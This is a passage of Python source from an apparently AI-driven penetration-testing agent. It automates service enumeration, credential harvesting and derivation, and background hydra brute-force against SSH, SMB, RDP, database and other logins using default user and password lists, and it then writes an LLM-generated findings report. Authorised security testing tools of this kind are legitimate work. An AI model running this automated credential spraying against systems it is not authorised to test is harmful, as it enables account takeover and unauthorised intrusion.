                cid = purragent_db.add_credential(base, tid, cand["username"],
                    cand["secret"], "password", scope="specific",
                    service_hint=hit_key, source="derived")
                purragent_db.set_cred_validated(base, cid, True, hit_port)
                purragent_db.add_username(base, tid, cand["username"],
                                          source="derived", service_hint=hit_key)
                eng.setdefault("exploit_findings", []).append(
                    {"port": hit_port,
                     "finding": f"derived {hit_key} login {cand['username']}"})
            except Exception:                          # noqa: BLE001
                pass
            found += 1
            _post(ctx, lambda cc=cand, k=hit_key, p=hit_port:
                  _print_cred_result("derived", cc, k, p))
    _post(ctx, lambda f=found: console.print(Text(
        f"    {f} login(s) derived from findings",
        style=("green" if found else "bright_black"))))


# ── phase 5 brute-force gate (background, fire-and-forget) ────────────────────
# Last resort per service: when NO validated credential and NO working anonymous/null
# login exists for it, spray the harvested usernames (or a default userlist) against a
# small password list. Run OUTSIDE the MCP server — a 15-min hydra over one stdio pipe
# would block every other tool — as a backgrounded subprocess with its own deadline +
# killpg, a few in parallel, so the operator gets control back immediately and results
# land as they finish. Deliberately bounded (small lists, -f stop-on-first, capped
# threads); gated by config so it stays off for lockout-sensitive engagements.
BRUTE_MINUTES = 15                 # per-service hydra deadline
BRUTE_MAX_PARALLEL = 2             # concurrent hydra processes
BRUTE_THREADS = 4                  # hydra -t (parallel logins within one job)
_BRUTE_SERVICES = {                # pshunter service class → hydra module
    "ssh": "ssh", "ftp": "ftp", "smb": "smb", "mysql": "mysql", "mssql": "mssql",
    "psql": "postgres", "rdp": "rdp", "telnet": "telnet", "vnc": "vnc",
}
_BRUTE_SEED_USERS = ["root", "admin", "administrator", "user", "guest", "test",
                     "oracle", "postgres", "mysql", "service"]
_BRUTE_PASS_FILES = [
    "/usr/share/wordlists/fasttrack.txt",
    "/usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt",
    "/usr/share/wordlists/metasploit/unix_passwords.txt",
]
_BRUTE_FALLBACK_PASSWORDS = [
    "password", "123456", "admin", "root", "toor", "letmein", "password123",
    "qwerty", "welcome", "changeme", "P@ssw0rd", "administrator", "12345678",
    "test", "guest", "1234", "root123", "admin123", "pass123", "secret",
]
_HYDRA_HIT = re.compile(
    r"\[\d+\]\[[^\]]+\]\s+host:\s*\S+\s+login:\s*(\S+)\s+password:\s*(\S*)")


def _brute_enabled(base_dir: str) -> bool:
    """The single gate for auto brute-force. Reads appdata/app_config.json
    purragent.bruteforce (default True) — the switch to bind to a ctf/pentest mode."""
    try:
        with open(os.path.join(base_dir, "appdata", "app_config.json")) as f:
            v = (json.load(f).get("purragent") or {}).get("bruteforce")
        return True if v is None else bool(v)
    except Exception:                                  # noqa: BLE001
        return True


def _service_has_login(creds: list, key: str, port: int) -> bool:
    """True when a validated credential (or working null/anon login) already covers this
    service — in which case brute-force is pointless and skipped."""
    for c in creds:
        if c.get("validated") != 1:
            continue
        try:
            vp = json.loads(c.get("valid_on") or "[]")
        except (ValueError, TypeError):
            vp = []
        if c.get("service_hint") == key or port in vp:
            return True
    return False


def _write_tmp_list(items: list, prefix: str) -> str:
    fd, path = tempfile.mkstemp(prefix=prefix, suffix=".txt")
    with os.fdopen(fd, "w") as f:
        f.write("\n".join(items) + "\n")
    return path


def _brute_passfile():
    """Return (path, tmp_to_cleanup): an existing small password list if present, else a
    built-in fallback written to a temp file."""
    for p in _BRUTE_PASS_FILES:
        if os.path.exists(p):
            return p, None
    path = _write_tmp_list(_BRUTE_FALLBACK_PASSWORDS, "purr_pw_")
    return path, path


def _brute_userlist(base_dir: str, tid: int) -> list:
    """The harvested usernames (targeted) or the default seed list when the pool is
    empty (the 'nothing known' case), deduped, order-preserving."""
    users = [u["username"] for u in purragent_db.fetch_usernames(base_dir, tid)]
    if not users:
        users = list(_BRUTE_SEED_USERS)
    seen, uniq = set(), []
    for u in users:
        if u and u not in seen:
            seen.add(u)
            uniq.append(u)
    return uniq


def _run_brute_proc(argv: list, cancel, deadline_s: float) -> dict:
    """Run one hydra to completion as its own process group, cancellable + deadlined.
    Returns {output, cancelled, timed_out}."""
    try:
        proc = subprocess.Popen(argv, stdin=subprocess.DEVNULL,
                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                text=True, start_new_session=True)
    except Exception as exc:                           # noqa: BLE001
        return {"output": str(exc), "cancelled": False, "timed_out": False}
    start, timed_out = time.time(), False
    while proc.poll() is None:
        if cancel is not None and cancel.is_set():
            _kill_proc_group(proc)
            break
        if (time.time() - start) > deadline_s:
            timed_out = True
            _kill_proc_group(proc)
            break
        time.sleep(0.4)
    try:
        out, _e = proc.communicate(timeout=5)
    except Exception:                                  # noqa: BLE001
        _kill_proc_group(proc)
        out = ""
    return {"output": out or "",
            "cancelled": bool(cancel is not None and cancel.is_set()),
            "timed_out": timed_out}


def _print_brute_line(state: str, key: str, port: int, extra: str = "",
                      num=None) -> None:
    color = {"running": "default", "found": "green", "none": "bright_black",
             "aborted": "magenta", "timeout": "red"}.get(state, "bright_black")
    line = Text("  ")
    line.append(f"[{state}" + (f" {num}" if num else "") + "]", style=color)
    line.append(f" ▸ brute · {key}  → {port}", style=color)
    if extra:
        line.append(f"  {extra}", style=color)
    console.print(line)


def _brute_worker(eng: dict, sem, job: dict, port: int, key: str, hydra_svc: str,
                  userfile: str, passfile: str, num: int) -> None:
    """One backgrounded hydra job against a single service; on a hit, stores the
    credential (validated) and adds the username to the pool."""
    ctx, base, tid, host = eng["ctx"], eng["base_dir"], eng["tid"], eng["ip"]
    with sem:                                          # cap concurrent hydra processes
        if job["cancel"].is_set():
            job["state"] = "aborted"
            return
        _post(ctx, lambda: _print_brute_line("running", key, port, num=num))
        argv = ["hydra", "-L", userfile, "-P", passfile, "-t", str(BRUTE_THREADS),
                "-f", "-I", "-s", str(port), host, hydra_svc]
        res = _run_brute_proc(argv, job["cancel"], BRUTE_MINUTES * 60)
    hits = _HYDRA_HIT.findall(res["output"])
    if hits:
        job["state"] = "complete"
        for user, pw in hits:
            try:
                cid = purragent_db.add_credential(base, tid, user, pw, "password",
                    scope="specific", service_hint=key, source="brute")
                purragent_db.set_cred_validated(base, cid, True, port)
                purragent_db.add_username(base, tid, user, source="brute",
                                          service_hint=key)
                finding = f"brute-forced {key} login: {user}"
                purragent_db.add_exploit_finding(base, tid, port, "tcp", key,
                                                 "brute-force", "", finding)
                eng.setdefault("exploit_findings", []).append(
                    {"port": port, "finding": finding})
            except Exception:                          # noqa: BLE001
                pass
            _post(ctx, lambda u=user: _print_brute_line(
                "found", key, port, f"{u}:***", num=num))
    elif res["cancelled"]:
        job["state"] = "aborted"
        _post(ctx, lambda: _print_brute_line("aborted", key, port, num=num))
    elif res["timed_out"]:
        job["state"] = "error"
        _post(ctx, lambda: _print_brute_line("timeout", key, port,
                                             f"({BRUTE_MINUTES}m budget)", num=num))
    else:
        job["state"] = "complete"
        _post(ctx, lambda: _print_brute_line("none", key, port, "no login found",
                                             num=num))


def _brute_reaper(eng: dict, threads: list, tmp_files: list, on_done) -> None:
    """Wait for every background brute job, clean up temp wordlists, post a one-line
    closing summary, then run on_done (the final report + finish) so the summary reflects
    any brute-forced logins. Runs off the walk thread, so the REPL stays responsive."""
    for t in threads:
        t.join()
    for p in tmp_files:
        if p:
            try:
                os.remove(p)
            except OSError:
                pass
    base, tid = eng["base_dir"], eng["tid"]
    found = [c for c in purragent_db.fetch_credentials(base, tid)
             if c.get("source") == "brute"]
    _post(eng["ctx"], lambda n=len(found): console.print(Text(
        f"  ▸ brute-force finished — {n} login(s) cracked",
        style=("green" if found else "bright_black"))))
    on_done()


def _run_brute_gate(eng: dict, on_done) -> bool:
    """Launch background brute-force for every eligible service (no validated cred / no
    anon login). Returns True if jobs were launched — in which case on_done (the final
    report + finish) runs from the reaper once every job completes, so the summary
    reflects the brute results. Returns False (nothing launched) when disabled, hydra is
    missing, or nothing is eligible — the caller then runs on_done itself."""
    ctx, base, tid, host = eng["ctx"], eng["base_dir"], eng["tid"], eng["ip"]
    if eng.get("cancelled") or not _brute_enabled(base):
        return False
    present: dict = {}
    for port, _proto, _label, key, _ver in _exploit_order(base, tid):
        if key in _BRUTE_SERVICES and key not in present:
            present[key] = port                        # first port per service class
    if not present:
        return False
    creds = purragent_db.fetch_credentials(base, tid)
    eligible = [(k, p) for k, p in present.items()
                if not _service_has_login(creds, k, p)]
    if not eligible:
        return False
    if not shutil.which("hydra"):
        _post(ctx, lambda: console.print(Text(
            "  ▸ brute-force skipped — hydra not installed", style="bright_black")))
        return False
    passfile, pass_tmp = _brute_passfile()
    userfile = _write_tmp_list(_brute_userlist(base, tid), "purr_user_")
    phase = {"phase": "brute-force", "ip": host, "jobs": [], "background": True}
    ctx.setdefault("phases", []).append(phase)
    eng["brute_count"] = len(eligible)
    _post(ctx, lambda n=len(eligible): console.print(Text(
        f"  ▸ brute-force — {n} service(s) with no login, running in background "
        f"(max {BRUTE_MINUTES}m each) — summary follows when done",
        style="bright_black")))
    sem = threading.Semaphore(BRUTE_MAX_PARALLEL)
    threads = []
    for key, port in eligible:                         # number each brute job
        n = _next_seq(eng)
        job = _job(f"hydra -L users -P pass -s {port} {host} {_BRUTE_SERVICES[key]}")
        phase["jobs"].append(job)
        t = threading.Thread(target=_brute_worker,
                             args=(eng, sem, job, port, key, _BRUTE_SERVICES[key],
                                   userfile, passfile, n), daemon=True)
        t.start()
        threads.append(t)
    threading.Thread(target=_brute_reaper,
                     args=(eng, threads, [userfile, pass_tmp], on_done),
                     daemon=True).start()
    return True


def _start_service_exploitation(eng: dict) -> None:
    """Phase 5 entry: kick off the sequential exploitation walk in the background."""
    with eng["lock"]:
        if eng["cancelled"]:
            return
        eng["exploit_phase"] = {"phase": "service exploitation", "ip": eng["ip"],
                                "jobs": []}
        eng["ctx"].setdefault("phases", []).append(eng["exploit_phase"])
    console.print(_phase_banner(5, "service exploitation", budget=False))
    console.print(Text("    running each service's target-only enumeration in order "
                       "(creds/listener commands skipped)", style="bright_black"))
    threading.Thread(target=_exploit_worker, args=(eng,), daemon=True).start()


def _exploit_worker(eng: dict) -> None:
    """Walk services (priority order) → steps → commands, running only the target-only
    ones, extracting findings from each output, then close out the recon."""
    import pshunter
    base, tid, ip = eng["base_dir"], eng["tid"], eng["ip"]
    for port, proto, label, key, _ver in _exploit_order(base, tid):
        if eng.get("cancelled"):
            break
        steps = pshunter._EXPLOIT_STEPS.get(key) or pshunter._EXPLOIT_STEPS["other"]
        cmds_by_step = (pshunter._STEP_COMMANDS.get(key)
                        or pshunter._STEP_COMMANDS["other"])
        _post(eng["ctx"], lambda p=port, k=key, lb=label:
              console.print(Text(f"    → {p}/{k}  ·  {lb}", style="bright_black")))
        ran = skipped = missing_cmds = 0
        missing_tools: set = set()
        ran_cmds: list = []                    # commands actually run, for the review
        for n, step in enumerate(steps, 1):
            if eng.get("cancelled"):
                break
            step_desc = step[0] if isinstance(step, (tuple, list)) else step
            for raw in (cmds_by_step.get(n) or []):
                if eng.get("cancelled"):
                    break
                cmd = _fill_exploit_cmd(raw, ip, port)
                binname = _cmd_binary(cmd) if cmd else None
                if not cmd or not binname or not _exploit_cmd_safe(cmd):
                    skipped += 1                        # placeholder / creds / denied
                    continue
                if not shutil.which(binname):           # tool missing → flag in red
                    missing_tools.add(binname)
                    missing_cmds += 1
                    continue
                ran += 1
                ran_cmds.append(cmd)
                label_cmd = f"{port}/{key}  ·  {cmd}"
                job = _job(cmd)
                with eng["lock"]:
                    eng["exploit_phase"]["jobs"].append(job)
                    eng["seq"] = eng.get("seq", 0) + 1     # under lock → inline
                    cnum = eng["seq"]
                _post(eng["ctx"], lambda lc=label_cmd, nm=cnum: console.print(
                    _phase_banner(5, lc, minutes=EXPLOIT_CMD_MINUTES, num=nm)))
                result = _run_exploit_cmd(cmd, job["cancel"])
                job["state"] = ("aborted" if result["cancelled"]
                                else "error" if not result["ok"] else "complete")
                finding = None
                reason = ""
                if job["state"] == "complete":
                    eng["thinking"] = True             # model analysing the output
                    _invalidate_toolbar(eng["ctx"])    # redraw → show 'thinking…'
                    try:
                        finding = _extract_exploit_finding(eng, port, key, step_desc,
                                                           cmd, result["output"])
                    finally:
                        eng["thinking"] = False
                        _invalidate_toolbar(eng["ctx"])
                    if finding:
                        # Safety net: skip a near-duplicate of what this port already
                        # holds (the model is told not to repeat, but small ones slip).
                        with eng["lock"]:
                            prior = [f["finding"] for f in eng["exploit_findings"]
                                     if f.get("port") == port]
                            dup = _is_dup_finding(finding, prior)
                            if not dup:
                                eng["exploit_findings"].append(
                                    {"port": port, "finding": finding})
                        if dup:
                            finding = None             # nothing new → show 'no findings'
                        else:
                            try:
                                purragent_db.add_exploit_finding(
                                    base, tid, port, proto, key, step_desc, cmd, finding)
                            except Exception:          # noqa: BLE001
                                pass
                elif job["state"] == "error":
                    # No LLM on failures — the exit code + stderr already say why.
                    reason = _exploit_fail_reason(result)
                _post(eng["ctx"], lambda lc=label_cmd, st=job["state"], f=finding,
                      nm=cnum, rs=reason:
                      _print_exploit_outcome(lc, st, f, num=nm, reason=rs))
        if missing_tools:
            def _miss(mc=missing_cmds, tools=sorted(missing_tools)):
                line = Text("  ")           # align marker with [running]/[complete]
                line.append("[skipped]", style="red")
                line.append(f" {mc} command(s) — tool(s) not installed: ",
                            style="red")
                line.append(", ".join(tools), style="bold red")
                line.append("  · run /doctor to list missing tools",
                            style="bright_black")
                console.print(line)
            _post(eng["ctx"], _miss)
        if skipped:
            _post(eng["ctx"], lambda s=skipped: console.print(Text(
                f"  ({s} command(s) skipped — need creds/listener or out of scope)",
                style="bright_black")))
        if ran and not eng.get("cancelled"):           # LLM reviews this service
            svc_finds = [f["finding"] for f in eng["exploit_findings"]
                         if f.get("port") == port]
            _run_service_review(eng, port, proto, key, label, svc_finds, ran_cmds)
    _run_cred_harvest(eng)                             # seed/extract/validate credentials
    _run_cred_derivation(eng)                          # deduced logins (before brute)
    _run_exploit_agent(eng)                            # cross-service correlation (now has creds)

    def _finish():                                     # summary + close-out
        if eng.get("cancelled"):                       # user /stopped during brute
            return
        _run_final_report(eng)                         # summary — reflects brute results
        _post(eng["ctx"], lambda: _finish_recon(eng))

    # Brute runs in the background; the summary waits for it (via the reaper) so it can
    # include any cracked logins. When nothing is brute-forced, summarise right away.
    if not _run_brute_gate(eng, _finish):
        _finish()


def _print_exploit_outcome(label: str, state: str, finding, num=None,
                           reason: str = "") -> None:
    """Per-command completion line + either the LLM-extracted finding (complete) or a
    short deterministic reason (failed)."""
    out = _phase_state_line(5, label, state, num=num)
    if state == "complete":
        if finding:
            out.append("\n")
            for ln in str(finding).splitlines():
                out.append("        " + ln + "\n", style="green")
        else:
            out.append("\n        no findings", style="bright_black")
    elif reason:
        out.append("\n        " + reason, style="bright_black")
    console.print(out)


# ── final report (one LLM call over the whole findings DB) ────────────────────
# After phase 5 the model turns every finding into a short, plain-language report for
# the operator — WHAT was found and why it matters, prioritised. Deliberately NO
# commands/tools used (those are deterministic and can be attached from the DB by code
# later, which is more reliable than asking the model to recount them). One call, no
# tools; skipped cleanly with no model.
_REPORT_SYSTEM = (
    "You are a penetration tester writing a SHORT findings report for the operator, "
    "from the recon and service-enumeration results below. Summarise WHAT was found "
    "and why it matters: exposed services, vulnerabilities (known-exploited / high "
    "first), credentials, exposed files or data, and misconfigurations — prioritised, "
    "concise, factual, in plain language (a few short paragraphs or bullets). Do NOT "
    "mention the specific commands or tools that were run. If there is little to "
    "report, say so briefly.")


def _report_context(base_dir: str, tid: int) -> str:
    """A compact, deterministic dump of the findings (no commands) to summarise."""
    lines = []
    ports = purragent_db.fetch_ports(base_dir, tid)
    if ports:
        lines.append("Open services:")
        for p in ports:
            svc = " ".join(x for x in (p.get("service"), p.get("product"),
                                       p.get("version")) if x) or "unknown"
            lines.append(f"  {p['port']}/{p.get('proto') or 'tcp'}  {svc}")
    vulns = purragent_db.fetch_vulns(base_dir, tid)
    v3 = [v for v in vulns if v.get("script") != "cve-lookup"]
    cve = [v for v in vulns if v.get("script") == "cve-lookup"]
    if v3:
        lines.append("Confirmed vulnerabilities / weaknesses:")
        for v in v3:
            lines.append(f"  {v.get('port')}: {v.get('summary')} "
                         f"[{v.get('risk')}]"
                         + (f" {v['cve']}" if v.get("cve") else ""))
    if cve:
        lines.append("Version-based CVEs:")
        for v in cve:
            lines.append(f"  {v.get('port')}: {v.get('summary')}")
    ef = [e for e in purragent_db.fetch_exploit_findings(base_dir, tid)
          if e.get("service") not in ("review", "report")]
    if ef:
        lines.append("Service enumeration findings:")
        for e in ef:
            where = e["port"] if e.get("port") else "host"
            for ln in (e.get("finding") or "").splitlines():
                if ln.strip():
                    lines.append(f"  [{where}] {ln.strip()}")
    return "\n".join(lines)


def _print_report(report: str) -> None:
    console.print(Text("  ▬ summary", style="bold green"))
    for ln in report.splitlines():
        console.print(Text("    " + ln, style="green"))


def _print_commands_appendix(eng: dict) -> None:
    """Deterministic 'what was run' appendix — every command of every phase with its
    state, straight from the recorded jobs (no LLM)."""
    phases = eng["ctx"].get("phases") or []
    if not any(ph.get("jobs") for ph in phases):
        return
    console.print(Text("  ▬ commands run", style=f"bold {VIOLET}"))
    for ph in phases:
        jobs = ph.get("jobs") or []
        if not jobs:
            continue
        console.print(Text(f"    {ph.get('phase', 'phase')}", style="bright_black"))
        for j in jobs:
            word, color = _STATE_TAG.get(j.get("state"),
                                         (str(j.get("state")), "bright_black"))
            line = Text("      ")
            line.append(f"[{word}]", style=color)
            line.append("  " + (j.get("command") or ""), style="bright_black")
            console.print(line)


def _run_final_report(eng: dict) -> None:
    """One tool-free LLM call turning the findings DB into a user-facing mini report;
    stored and printed. No-op when there's no model or nothing to report."""
    ctx, base = eng["ctx"], eng["base_dir"]
    profile = ctx.get("profile")
    if not profile or eng.get("cancelled"):
        return
    context = _report_context(base, eng["tid"])
    if not context.strip():
        return
    body = {"model": profile.get("model", ""),
            "messages": [{"role": "system", "content": _REPORT_SYSTEM},
                         {"role": "user", "content": f"Target {eng['ip']} — "
                          f"results:\n\n{context}"}],
            "temperature": AGENT_TEMPERATURE}
    custom = psai._parse_custom_params(profile)
    if custom:
        body.update(custom)
    _post(ctx, lambda: console.print(Text("  ▸ writing report…", style="bright_black")))
    eng["thinking"] = True
    _invalidate_toolbar(ctx)
    parts: list = []
    try:
        endpoint, api_key = _openai_endpoint(profile, base)
        _chat_stream(endpoint, api_key, body, lambda t: parts.append(t),
                     hide_thinking=True, render_reasoning=False,
                     max_seconds=AGENT_TURN_MAX_SECONDS)
    except Exception:                                  # noqa: BLE001
        pass
    finally:
        eng["thinking"] = False
        _invalidate_toolbar(ctx)
    report = "".join(parts).strip()
    if report:
        try:
            purragent_db.add_exploit_finding(base, eng["tid"], 0, "tcp", "report",
                                             "final report", "", report)
        except Exception:                              # noqa: BLE001
            pass
        _post(ctx, lambda r=report: _print_report(r))
    else:
        # The model returned nothing usable (error / only reasoning / capped) — still
        # close with the deterministic findings so the run always ends on a summary.
        _post(ctx, lambda c=context: _print_report(c))


def _finish_recon(eng: dict) -> None:
    """The automated kill-chain (phases 1–5) is done; deeper exploitation (creds,
    shells, privesc) stays interactive, so the loop hands back to the operator here."""
    eng["recon_done"] = True                           # clears the toolbar progress tag
    console.print(Text("  ▸ automated recon complete — phases 1–5 done",
                       style=f"bold {VIOLET}"))
    hint = Text("    review with ", style="bright_black")
    hint.append("/status", style="cyan")
    hint.append(" or ", style="bright_black")
    hint.append("/target", style="cyan")
    hint.append(", or ask about next steps with ", style="bright_black")
    hint.append("btw", style="cyan")
    hint.append("  ·  deeper exploitation (creds/shells/privesc) is manual.",
                style="bright_black")
    console.print(hint)
    if _brute_running(eng["ctx"]):
        note = Text("    ", style="bright_black")
        note.append(f"{eng.get('brute_count', 0)} brute-force job(s) still running in "
                    "the background — ", style="bright_black")
        note.append("/status", style="cyan")
        note.append(" to watch, ", style="bright_black")
        note.append("/stop", style="cyan")
        note.append(" to abort them.", style="bright_black")
        console.print(note)
    # Auto-/stop: the automated run is done, so leave the agent in the stopped state
    # (as if the operator typed /stop) — /start re-runs, /target changes the target.
    # Background brute jobs deliberately survive this (only an explicit /stop kills them).
    _cancel_engagement(eng["ctx"])
    eng["ctx"]["hacking"] = False


def _pause_engagement(ctx) -> None:
    """No-port dead end: pause the engagement (stopped state) with the retry hint."""
    if ctx is not None:
        ctx["hacking"] = False
    line = Text("  ⏸ paused — ", style="yellow")
    line.append("/start", style="cyan")
    line.append(" to retry or ", style="bright_black")
    line.append("/target", style="cyan")
    line.append(" to add ports.", style="bright_black")
    console.print(line)


# /status — pshunter-style read-only view (no view/stop/abort actions).
_STATUS_STATE = {"running": ("default", "running"), "complete": ("green", "complete"),
                 "error": ("red", "error"), "aborted": ("magenta", "aborted")}


def _phase_agg_state(phase: dict) -> str:
    """Aggregate a phase's per-job states for its header line."""
    states = [j.get("state") for j in phase.get("jobs", [])]
    if not states or "running" in states:
        return "running"
    if "complete" in states:
        return "complete"
    if "error" in states:
        return "error"
    return "aborted"


def _status_render(ctx: dict, out: "Console") -> None:
    """Render the engagement's phases like pshunter's status to `out`: per phase a
    numbered line with the host, aggregate state and found yes/no, and EVERY scan of
    that phase beneath it with its own complete/running state (numbered 1/2/3 when
    several). Read-only. `out` is any rich Console — the live REPL console (inline) or
    a capture console (the alt-screen window)."""
    phases = list(ctx.get("phases") or [])             # snapshot: worker threads mutate
    eng = ctx.get("engagement") or {}
    out.print(Text("Status", style="bold"))
    if not phases:
        out.print(Text("  no scans have run yet", style="bright_black"))
        return
    for n, phase in enumerate(phases, 1):
        jobs = list(phase.get("jobs") or [])
        agg = _phase_agg_state(phase)
        acol, alabel = _STATUS_STATE.get(agg, ("bright_black", agg))
        if phase.get("phase") == "service exploitation":
            got = bool(eng.get("exploit_findings"))
        elif phase.get("phase") == "cve lookup":
            got = bool(eng.get("cve_results"))
        elif phase.get("phase") == "vuln scan":
            got = bool([f for f in (eng.get("vuln_findings") or [])
                        if f.get("state") in ("VULNERABLE", "LIKELY", "EXPOSED")])
        elif phase.get("phase") == "service detection":
            got = bool([s for s in (eng.get("svc_services") or [])
                        if s.get("name") and s["name"] != "unknown"])
        else:
            got = bool((eng.get("discovered_tcp") or set())
                       | (eng.get("discovered_udp") or set()))
        found_txt, found_style = (("yes", "green") if got and agg != "running"
                                  else ("—", "bright_black") if agg == "running"
                                  else ("no", "bright_black"))

        head = Text("  ")
        head.append(str(n), style="cyan")
        head.append(" ")
        head.append(phase.get("phase", "scan"), style="bold")
        if phase.get("ip"):
            head.append("  · ", style="bright_black")
            head.append(phase["ip"], style="cyan")
        head.append("  · ", style="bright_black")
        head.append(alabel, style=acol)
        head.append("  · found: ", style="bright_black")
        head.append(found_txt, style=found_style)
        if len(jobs) > 1:
            head.append(f"  · {len(jobs)} cmds", style="bright_black")
        out.print(head)

        multi = len(jobs) > 1
        width = len(str(len(jobs)))
        for k, job in enumerate(jobs):
            jcol, jlabel = _STATUS_STATE.get(job.get("state"),
                                             ("bright_black", job.get("state")))
            line = Text("       ")
            if multi:
                line.append(f"{k + 1:>{width}} ", style="cyan")
            line.append(f"{jlabel:<8}", style=jcol)
            line.append(" ")
            line.append(job.get("command") or "", style="bright_black")
            out.print(line)


def _status_view(ctx: dict) -> None:
    """/status — a live window on the alternate screen (like /target): re-renders the
    phases every second so you watch running→complete in place. ↑/↓ · PgUp/PgDn · g/G
    scroll, r refresh now, q/Esc return. Without a TTY it prints once inline."""
    if not sys.stdin.isatty():
        _status_render(ctx, console)
        return

    import termios
    import tty
    import select

    def _frame_lines() -> list:
        buf = io.StringIO()
        cols = shutil.get_terminal_size((80, 24)).columns
        cap = Console(file=buf, force_terminal=True, color_system="truecolor",
                      width=cols, highlight=False)
        _status_render(ctx, cap)
        return buf.getvalue().rstrip("\n").split("\n")

    offset = 0
    refresh = 1.0                                      # seconds between auto-redraws
    with _alt_screen():
        fd = sys.stdin.fileno()
        old = termios.tcgetattr(fd)
        try:
            tty.setcbreak(fd)
            while True:
                lines = _frame_lines()
                size = shutil.get_terminal_size((80, 24))
                page = max(1, size.lines - 1)          # last row = status bar
                max_off = max(0, len(lines) - page)
                offset = max(0, min(offset, max_off))
                visible = lines[offset:offset + page]
                visible = visible + [""] * (page - len(visible))
                buf = ["\x1b[H"]                        # home; per-line \x1b[K, no full clear
                for ln in visible:
                    buf.append(ln + "\x1b[0m\x1b[K\r\n")
                if max_off > 0:
                    last = min(offset + page, len(lines))
                    bar = (f" {offset + 1}-{last}/{len(lines)}   "
                           "↑/↓ scroll · r refresh · q return · live ")
                else:
                    bar = " r refresh · q return · live "
                buf.append(f"\x1b[7m{bar}\x1b[0m\x1b[K")
                sys.stdout.write("".join(buf))
                sys.stdout.flush()

                # Wait up to `refresh` for a key; on timeout the loop redraws (live).
                if not select.select([fd], [], [], refresh)[0]:
                    continue
                key = _read_key(fd)
                if key in ("quit", "enter"):
                    break
                if key == "down":
                    offset += 1
                elif key == "up":
                    offset -= 1
                elif key == "pgdn":
                    offset += page
                elif key == "pgup":
                    offset -= page
                elif key == "home":
                    offset = 0
                elif key == "end":
                    offset = max_off
                # 'refresh'/unknown → next iteration redraws anyway
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old)
            termios.tcflush(fd, termios.TCIFLUSH)       # drop any leftover input
    _drain_stdin()


def _start_hacking(ctx: dict, base_dir: str, goal) -> None:
    """Begin the engagement on the recorded target: name the target + objective, then
    kick off the hacking loop at phase 1 (port discovery) in the BACKGROUND. Further
    phases follow. Called from the intake confirm and /start."""
    hosts = purragent_db.fetch_hosts(base_dir)
    if not hosts:
        console.print("  [yellow]no target recorded[/yellow]")
        return
    target = hosts[0]
    ctx["hacking"] = True                          # agent is now actively hacking
    console.print(Text(f"  ▸ starting engagement on {_host_label(target)}  ·  "
                       f"objective: {goal}", style=f"bold {VIOLET}"))
    # The streaming pipeline (phase 1 port discovery → incremental phase 2) starts
    # here and prints its own banner.
    _start_port_discovery(ctx, base_dir, target)


def _target_db_context(base_dir: str) -> str:
    """Everything the engagement database knows about the current target, as plain
    text — injected into `btw` questions so the model answers with full context."""
    try:
        engs = purragent_db.fetch_all(base_dir)
    except Exception:
        engs = []
    if not engs:
        return ""
    eng = engs[0]                                   # single target (newest)
    tgt = eng.get("target") or {}
    lines = ["What is known about the target (from the engagement database):",
             f"objective: {eng.get('objective') or '?'}"]
    for k in ("ip", "hostname", "domain", "url", "os", "platform"):
        if tgt.get(k):
            lines.append(f"{k}: {tgt[k]}")
    if eng.get("ports"):
        lines.append("ports: " + ", ".join(
            f"{p['port']}/{p.get('proto') or 'tcp'}"
            + (f" {p['service']}" if p.get("service") else "")
            for p in eng["ports"]))
    for c in eng.get("credentials", []):
        lines.append(f"credential: {c.get('username') or ''}:{c.get('secret') or ''}"
                     + (f" ({c['secret_type']})" if c.get("secret_type") else ""))
    for e in eng.get("endpoints", []):
        lines.append(f"endpoint: {e.get('url')}")
    for n in eng.get("notes", []):
        if n.get("kind") != "raw-intake" and n.get("text"):
            lines.append(f"note: {n['text']}")
    return "\n".join(lines)


def _btw(ctx: dict, base_dir: str, question: str) -> None:
    """`btw <question>` — a side question to the model during the engagement: sent
    tool-free, but with the full target database injected as context, so the model
    can reason about the target without acting on the system. Streams live in a
    clean alt-screen overlay (like /model); Esc/q returns to the main screen."""
    profile = ctx.get("profile")
    if not profile:
        console.print("  [yellow]No model selected.[/yellow] Type "
                      "[cyan]/model[/cyan] to choose one first.")
        return
    sys_parts = [PURRAGENT_SYSTEM, _env_block()]
    dbctx = _target_db_context(base_dir)
    if dbctx:
        sys_parts.append(dbctx)
    custom = profile.get("custom_system", "").strip()
    if custom:
        sys_parts.append(custom)
    body = {"model": profile.get("model", ""),
            "messages": [{"role": "system", "content": "\n\n".join(sys_parts)},
                         {"role": "user", "content": question}],
            "temperature": AGENT_TEMPERATURE}
    custom_params = psai._parse_custom_params(profile)
    if custom_params:
        body.update(custom_params)                  # note: no `tools` field — tool-free
    endpoint, api_key = _openai_endpoint(profile, base_dir)

    def _run_stream(emit):
        # render_reasoning=False: reasoning must not write to the terminal directly,
        # or it would corrupt the alt-screen render.
        _chat_stream(endpoint, api_key, body, emit, hide_thinking=True,
                     render_reasoning=False)

    # The question is echoed as a coloured header (chat feel); the answer streams below.
    _stream_view("btw", _run_stream, header=question)


def _btw_chat(ctx: dict, base_dir: str, first_question: str) -> None:
    """Multi-turn `btw` chat in a clean alt-screen overlay: your questions (cyan)
    and the model's streamed answers, tool-free, with the target database injected
    as context (refreshed each turn). After an answer, type the next question —
    Enter sends, Esc exits, Ctrl-C cancels the current answer. Non-TTY → single shot."""
    profile = ctx.get("profile")
    if not profile:
        console.print("  [yellow]No model selected.[/yellow] Type "
                      "[cyan]/model[/cyan] to choose one first.")
        return
    if not sys.stdin.isatty():
        _btw(ctx, base_dir, first_question)       # no interactive input off a TTY
        return

    import termios
    import tty
    import textwrap
    import select

    endpoint, api_key = _openai_endpoint(profile, base_dir)
    model = profile.get("model", "")
    custom_params = psai._parse_custom_params(profile)
    custom = profile.get("custom_system", "").strip()
    hide_thinking = bool(profile.get("hide_thinking", False))

    def _system():
        parts = [PURRAGENT_SYSTEM, _env_block()]
        db = _target_db_context(base_dir)         # re-read so new scan ports show up
        if db:
            parts.append(db)
        if custom:
            parts.append(custom)
        return {"role": "system", "content": "\n\n".join(parts)}

    transcript: list = []                         # (role, text) for rendering
    messages: list = []                           # user/assistant turns for the API
    size = shutil.get_terminal_size((80, 24))
    width = max(20, size.columns - 2)
    rows = max(5, size.lines)

    def _lines(pending=None):
        turns = transcript + ([("assistant", pending)] if pending is not None else [])
        out = []
        for role, text in turns:
            color = "\x1b[1;36m" if role == "user" else "\x1b[0m"
            for j, wl in enumerate(textwrap.wrap(text, width) or [""]):
